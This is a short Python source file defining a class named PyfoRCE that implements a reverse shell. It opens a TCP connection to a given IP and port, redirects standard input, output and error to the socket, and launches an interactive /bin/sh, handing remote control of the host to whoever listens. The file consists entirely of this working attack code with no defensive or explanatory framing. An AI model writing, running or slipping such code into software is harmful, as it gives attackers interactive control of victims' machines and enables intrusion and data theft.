import socket
import subprocess
import os


class PyfoRCE(object):
    def __init__(self, ip, port=1337, shell="/bin/sh", args="-i"):
        self.ip = ip
        self.port = port
        self.shell = shell
        self.args = args
        self.sock = None
        self.process = None

    def open(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.ip, self.port))
        os.dup2(self.sock.fileno(), 0)
        os.dup2(self.sock.fileno(), 1)
        os.dup2(self.sock.fileno(), 2)
        self.process = subprocess.Popen([self.shell, self.args])

    def close(self):
        if isinstance(self.sock, socket.socket):
            self.sock.close()
            self.sock = None
            self.process = None
